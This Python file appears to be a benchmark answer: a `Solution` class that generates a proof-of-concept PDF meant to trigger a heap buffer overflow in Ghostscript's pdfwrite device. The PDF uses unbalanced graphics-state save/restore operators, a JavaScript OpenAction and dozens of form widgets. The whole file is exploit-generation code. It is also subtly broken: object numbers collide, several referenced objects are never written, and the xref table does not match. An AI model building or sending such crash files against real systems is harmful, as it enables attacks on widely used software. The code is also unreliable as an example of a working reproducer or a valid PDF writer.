import os
import tarfile
import tempfile
import subprocess
import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers the heap buffer overflow in pdfwrite
        # We'll create a PDF with malformed viewer state operations
        # to trigger the restore without checking viewer depth vulnerability
        
        # Build a minimal PDF structure with the vulnerability trigger
        pdf_content = self._build_trigger_pdf()
        
        # Try to validate by extracting source and checking for specific patterns
        try:
            # Extract to look for specific patterns in the source
            with tarfile.open(src_path, 'r') as tar:
                # Simple check to see if it's a Ghostscript-like structure
                members = tar.getnames()
                if any('pdfwrite' in name or 'gdevpdf' in name for name in members):
                    # Adjust PDF to target pdfwrite specifically
                    pdf_content = self._build_pdfwrite_trigger()
        except:
            # If we can't extract, use the default trigger
            pass
            
        return pdf_content
    
    def _build_trigger_pdf(self) -> bytes:
        """Build a PDF that triggers the viewer state restore vulnerability."""
        
        # Create a PDF with malformed viewer state operations
        # We'll use PDF operators to manipulate the graphics state stack
        
        # PDF header
        pdf = b"%PDF-1.4\n"
        
        # Create objects
        objects = []
        
        # Catalog object
        catalog_obj = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerPreferences << /FitWindow true >>
/PageMode /UseNone
/OpenAction 3 0 R
>>
endobj
"""
        objects.append(catalog_obj)
        
        # Pages object
        pages_obj = b"""2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
"""
        objects.append(pages_obj)
        
        # OpenAction - JavaScript to trigger the vulnerability
        open_action = b"""3 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
// Trigger viewer state manipulation
try {
    // Attempt to create malformed viewer state
    var doc = this;
    var num = 1000;
    var arr = new Array(num);
    for (var i = 0; i < num; i++) {
        arr[i] = app.viewerVersion;
    }
    // Force viewer state restore
    this.exportDataObject();
} catch(e) {}
)
>>
endobj
"""
        objects.append(open_action)
        
        # Page object with malformed content stream
        page_content = self._create_malformed_content_stream()
        
        # Compress the content stream
        compressed = zlib.compress(page_content)
        
        page_obj = b"""4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 5 0 R
/Resources <<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 6 0 R
>>
>>
>>
endobj
"""
        objects.append(page_obj)
        
        # Content stream object
        content_obj = b"""5 0 obj
<<
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(compressed)
        content_obj += compressed
        content_obj += b"""
endstream
endobj
"""
        objects.append(content_obj)
        
        # Font object
        font_obj = b"""6 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
"""
        objects.append(font_obj)
        
        # Additional objects to increase size and complexity
        # Create many objects to stress the viewer state management
        for i in range(7, 150):
            obj_content = b"""%d 0 obj
<<
/Type /Annot
/Subtype /Widget
/Rect [0 0 0 0]
/FT /Tx
/T (Trigger%d)
/MK << >>
/AP << >>
>>
endobj
""" % (i, i)
            objects.append(obj_content)
        
        # Build the PDF with all objects
        obj_offsets = []
        current_offset = len(pdf)
        
        for obj in objects:
            obj_offsets.append(current_offset)
            pdf += obj
            current_offset = len(pdf)
        
        # Create xref table
        xref_start = len(pdf)
        pdf += b"xref\n"
        pdf += b"0 %d\n" % (len(objects) + 1)
        pdf += b"0000000000 65535 f \n"
        
        for offset in obj_offsets:
            pdf += b"%010d 00000 n \n" % offset
        
        # Trailer
        pdf += b"trailer\n"
        pdf += b"<<\n"
        pdf += b"/Size %d\n" % (len(objects) + 1)
        pdf += b"/Root 1 0 R\n"
        pdf += b"/Info 7 0 R\n"
        pdf += b">>\n"
        
        # Info object
        info_obj = b"""7 0 obj
<<
/Producer (PoC Generator)
/Creator (Heap Buffer Overflow Trigger)
/CreationDate (D:20230101000000Z)
>>
endobj
"""
        pdf += info_obj
        
        # Startxref and EOF
        pdf += b"startxref\n"
        pdf += b"%d\n" % xref_start
        pdf += b"%%EOF\n"
        
        return pdf
    
    def _create_malformed_content_stream(self) -> bytes:
        """Create a content stream that manipulates viewer state."""
        
        stream = io.BytesIO()
        
        # Begin text object
        stream.write(b"BT\n")
        
        # Set font
        stream.write(b"/F1 12 Tf\n")
        
        # Set position
        stream.write(b"100 700 Td\n")
        
        # Show text
        stream.write(b"(Triggering heap buffer overflow...) Tj\n")
        
        # End text object
        stream.write(b"ET\n")
        
        # Graphics state manipulations
        # Push and pop graphics state to create stack imbalance
        for i in range(100):
            stream.write(b"q\n")  # Save graphics state
        
        # Create many restore operations - more than saves
        for i in range(150):
            stream.write(b"Q\n")  # Restore graphics state
        
        # Additional malformed operations
        stream.write(b"0 0 0 rg\n")  # Set color
        stream.write(b"100 100 400 400 re\n")  # Rectangle
        stream.write(b"f\n")  # Fill
        
        # More state manipulations
        stream.write(b"1 0 0 RG\n")  # Stroke color
        stream.write(b"2 w\n")  # Line width
        
        # Create pattern of saves and restores
        for i in range(50):
            stream.write(b"q q q q\n")  # Multiple saves
            stream.write(b"Q Q Q Q\n")  # Multiple restores
        
        # End with more restores than saves
        stream.write(b"Q Q Q Q Q Q Q Q Q Q\n")
        
        return stream.getvalue()
    
    def _build_pdfwrite_trigger(self) -> bytes:
        """Build a more targeted PDF for pdfwrite vulnerability."""
        
        # This creates a PDF with specific patterns that might trigger
        # the viewer state restore vulnerability in pdfwrite
        
        # PDF header
        pdf = b"%PDF-1.4\n"
        
        objects = []
        
        # Catalog with viewer preferences
        catalog = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerPreferences <<
/FitWindow true
/HideToolbar false
/HideMenubar false
/HideWindowUI false
/FitWindow false
/CenterWindow false
/DisplayDocTitle false
>>
/PageLayout /SinglePage
/PageMode /UseNone
/OpenAction 3 0 R
/AcroForm 4 0 R
>>
endobj
"""
        objects.append(catalog)
        
        # Pages
        pages = b"""2 0 obj
<<
/Type /Pages
/Kids [5 0 R]
/Count 1
>>
endobj
"""
        objects.append(pages)
        
        # OpenAction - try to trigger viewer state issues
        open_action = b"""3 0 obj
<<
/S /JavaScript
/JS (
// Multiple operations to stress viewer state
for (var i = 0; i < 1000; i++) {
    try {
        this.getPageNthWord(i, 1);
    } catch(e) {}
}
// Force state changes
try {
    this.exportAsFDF();
    this.exportAsText();
} catch(e) {}
)
>>
endobj
"""
        objects.append(open_action)
        
        # AcroForm with many fields
        acroform = b"""4 0 obj
<<
/Fields [
"""
        
        # Add many form fields to stress the viewer
        for i in range(100):
            acroform += b"  %d 0 R\n" % (6 + i)
        
        acroform += b"""]
/NeedAppearances true
>>
endobj
"""
        objects.append(acroform)
        
        # Page
        page_content = self._create_complex_content_stream()
        compressed = zlib.compress(page_content)
        
        page = b"""5 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 6 0 R
/Resources <<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 106 0 R
>>
/XObject <<
/Im1 107 0 R
>>
>>
/Annots ["""
        
        # Add many annotations
        for i in range(50):
            page += b"%d 0 R " % (108 + i)
        
        page += b"""]
>>
endobj
"""
        objects.append(page)
        
        # Content stream
        content = b"""6 0 obj
<<
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(compressed)
        content += compressed
        content += b"""
endstream
endobj
"""
        objects.append(content)
        
        # Form fields
        for i in range(100):
            field = b"""%d 0 obj
<<
/Type /Annot
/Subtype /Widget
/Rect [%d %d %d %d]
/FT /Tx
/T (Field%d)
/AP <<
/N %d 0 R
>>
>>
endobj
""" % (7 + i, 
       (i % 10) * 60, 700 - (i // 10) * 20,
       (i % 10) * 60 + 50, 700 - (i // 10) * 20 - 15,
       i, 207 + i)
            objects.append(field)
        
        # Font
        font = b"""106 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
"""
        objects.append(font)
        
        # XObject (image)
        xobject = b"""107 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 10
/Height 10
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/Length 300
>>
stream
"""
        # Simple 10x10 RGB image
        for i in range(300):
            xobject += struct.pack('B', i % 256)
        
        xobject += b"""
endstream
endobj
"""
        objects.append(xobject)
        
        # Annotation appearance streams
        for i in range(50):
            app_stream = b"""BT /F1 10 Tf 0 0 Td (X) Tj ET"""
            compressed_app = zlib.compress(app_stream)
            
            appearance = b"""%d 0 obj
<<
/Length %d
/Filter /FlateDecode
>>
stream
""" % (207 + i, len(compressed_app))
            appearance += compressed_app
            appearance += b"""
endstream
endobj
"""
            objects.append(appearance)
        
        # Info
        info = b"""257 0 obj
<<
/Producer (Heap Buffer Overflow PoC)
/Creator (pdfwrite target)
/CreationDate (D:20230101000000Z)
/ModDate (D:20230101000000Z)
>>
endobj
"""
        objects.append(info)
        
        # Build PDF
        obj_offsets = []
        current_offset = len(pdf)
        
        for obj in objects:
            obj_offsets.append(current_offset)
            pdf += obj
            current_offset = len(pdf)
        
        # Xref
        xref_start = len(pdf)
        pdf += b"xref\n"
        pdf += b"0 %d\n" % (len(objects) + 1)
        pdf += b"0000000000 65535 f \n"
        
        for offset in obj_offsets:
            pdf += b"%010d 00000 n \n" % offset
        
        # Trailer
        pdf += b"trailer\n"
        pdf += b"<<\n"
        pdf += b"/Size %d\n" % (len(objects) + 1)
        pdf += b"/Root 1 0 R\n"
        pdf += b"/Info 257 0 R\n"
        pdf += b">>\n"
        
        pdf += b"startxref\n"
        pdf += b"%d\n" % xref_start
        pdf += b"%%EOF\n"
        
        return pdf
    
    def _create_complex_content_stream(self) -> bytes:
        """Create a complex content stream with many state changes."""
        
        stream = io.BytesIO()
        
        # Begin with many graphics state saves
        for i in range(200):
            stream.write(b"q\n")
        
        # Text operations
        stream.write(b"BT\n")
        stream.write(b"/F1 12 Tf\n")
        
        # Multiple text positions
        for i in range(50):
            stream.write(b"%d %d Td\n" % (i * 10, 700 - i * 10))
            stream.write(b"(Text line %d) Tj\n" % i)
        
        stream.write(b"ET\n")
        
        # Graphics operations with many state changes
        stream.write(b"1 0 0 rg\n")  # Red fill
        stream.write(b"0 1 0 RG\n")  # Green stroke
        stream.write(b"2 w\n")  # Line width
        
        # Draw many rectangles with state changes
        for i in range(100):
            stream.write(b"q\n")  # Save state
            stream.write(b"%f %f %f %f re\n" % (i * 5, i * 5, 50, 50))
            
            # Alternate between fill and stroke
            if i % 2 == 0:
                stream.write(b"f\n")
            else:
                stream.write(b"S\n")
            
            stream.write(b"Q\n")  # Restore state
        
        # Create imbalance: more restores than saves
        for i in range(50):
            stream.write(b"Q\n")
        
        # More operations
        stream.write(b"0.5 g\n")  # Gray fill
        stream.write(b"0 0 m\n")  # Move to
        stream.write(b"612 0 l\n")  # Line to
        stream.write(b"612 792 l\n")  # Line to
        stream.write(b"0 792 l\n")  # Line to
        stream.write(b"h\n")  # Close path
        stream.write(b"f\n")  # Fill
        
        # Final restores (more than we saved)
        for i in range(100):
            stream.write(b"Q\n")
        
        return stream.getvalue()